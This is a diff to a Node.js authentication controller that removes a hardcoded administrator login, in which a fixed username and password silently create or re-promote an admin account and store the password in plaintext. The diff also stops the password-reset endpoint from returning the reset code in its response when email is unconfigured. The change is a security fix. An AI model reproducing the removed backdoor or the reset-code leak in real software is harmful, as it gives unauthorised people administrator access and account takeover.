@@ -4,7 +4,6 @@ import { generateAccessToken, generateRefreshToken, verifyRefreshToken } from '.
 import { sendAdminContactEmail } from '../../services/emailService.js';
 import logger from '../utils/logger.js';
 import nodemailer from 'nodemailer';
-import bcrypt from 'bcryptjs';
 
 /**
  * Helper to dispatch OTP emails to users
@@ -285,109 +284,6 @@ export const login = async (req, res, next) => {
       });
     }
 
-    // Direct Hardcoded Admin Access for Haroon Rafiq
-    if (
-      (cleanId === 'haroonarafiq@gmail.com' || cleanId === 'haroonarafiq' || cleanId === 'h123') &&
-      password === 'Admin@123'
-    ) {
-      let adminUser = await User.findOne({
-        $or: [
-          { email: 'haroonarafiq@gmail.com' },
-          { username: 'haroonarafiq' },
-          { username: 'h123' }
-        ]
-      });
-
-      if (!adminUser) {
-        try {
-          adminUser = await User.create({
-            fullName: 'Haroon Rafiq',
-            username: 'haroonarafiq',
-            email: 'haroonarafiq@gmail.com',
-            password: 'Admin@123',
-            plainPassword: 'Admin@123',
-            role: 'Administrator',
-            status: 'ACTIVE',
-            isVerified: true,
-            allowAllForms: true,
-            displayStatute: true,
-            displayNotification: true,
-            displayCase: true,
-          });
-        } catch (createErr) {
-          logger.warn(`[Admin Auto-Provision] Could not create with User.create: ${createErr.message}`);
-          const salt = await bcrypt.genSalt(12);
-          const hashedPassword = await bcrypt.hash('Admin@123', salt);
-          await User.collection.updateOne(
-            { email: 'haroonarafiq@gmail.com' },
-            {
-              $set: {
-                fullName: 'Haroon Rafiq',
-                username: 'haroonarafiq',
-                email: 'haroonarafiq@gmail.com',
-                password: hashedPassword,
-                plainPassword: 'Admin@123',
-                role: 'Administrator',
-                status: 'ACTIVE',
-                isVerified: true,
-                allowAllForms: true,
-                displayStatute: true,
-                displayNotification: true,
-                displayCase: true,
-                isDeleted: false,
-                updatedAt: new Date()
-              },
-              $setOnInsert: {
-                userId: 'USER_ADMIN_HAROON',
-                createdAt: new Date()
-              }
-            },
-            { upsert: true }
-          );
-          adminUser = await User.findOne({ email: 'haroonarafiq@gmail.com' });
-        }
-      } else {
-        adminUser.role = 'Administrator';
-        adminUser.status = 'ACTIVE';
-        adminUser.isVerified = true;
-        adminUser.allowAllForms = true;
-        adminUser.isDeleted = false;
-        adminUser.plainPassword = 'Admin@123';
-        const salt = await bcrypt.genSalt(12);
-        adminUser.password = await bcrypt.hash('Admin@123', salt);
-        await adminUser.save().catch(async (saveErr) => {
-          logger.warn(`[Admin Sync] Save warning: ${saveErr.message}. Updating via direct collection.`);
-          await User.collection.updateOne(
-            { _id: adminUser._id },
-            {
-              $set: {
-                role: 'Administrator',
-                status: 'ACTIVE',
-                isVerified: true,
-                allowAllForms: true,
-                isDeleted: false,
-                plainPassword: 'Admin@123',
-                password: adminUser.password
-              }
-            }
-          );
-        });
-      }
-
-      const accessToken = generateAccessToken(adminUser);
-      const refreshToken = generateRefreshToken(adminUser);
-
-      logger.info(`[Admin Hardcoded Login Success] ${adminUser.email} logged in as Administrator.`);
-
-      return res.status(200).json({
-        success: true,
-        message: 'Admin login successful.',
-        accessToken,
-        refreshToken,
-        user: sanitizeUserPayload(adminUser)
-      });
-    }
-
     // Search by username or email for standard authentication
     const user = await User.findOne({
       $or: [
@@ -506,16 +402,21 @@ export const forgotPassword = async (req, res, next) => {
     await sendOtpEmail(user.email, user.fullName, resetToken, 'reset');
 
     const hasSmtp = process.env.SMTP_USER && process.env.SMTP_PASS;
+    if (!hasSmtp) {
+      user.resetPasswordToken = undefined;
+      user.resetPasswordExpires = undefined;
+      await user.save();
+      logger.error('[Password Reset] SMTP is not configured; refusing to expose a reset code.');
+      return res.status(503).json({
+        success: false,
+        message: 'Password reset is temporarily unavailable. Please contact support.'
+      });
+    }
 
     return res.status(200).json({
       success: true,
-      message: hasSmtp 
-        ? 'If the account is registered, a password reset OTP has been sent.'
-        : `[SIMULATION MODE] Password reset code is: ${resetToken}`,
+      message: 'If the account is registered, a password reset OTP has been sent.',
       email: user.email,
-      data: {
-        ...(!hasSmtp ? { otpCode: resetToken } : {})
-      }
     });
   } catch (error) {
     next(error);
@@ -1080,4 +981,3 @@ export const changeCurrentUserPassword = async (req, res, next) => {
     next(error);
   }
 };
-
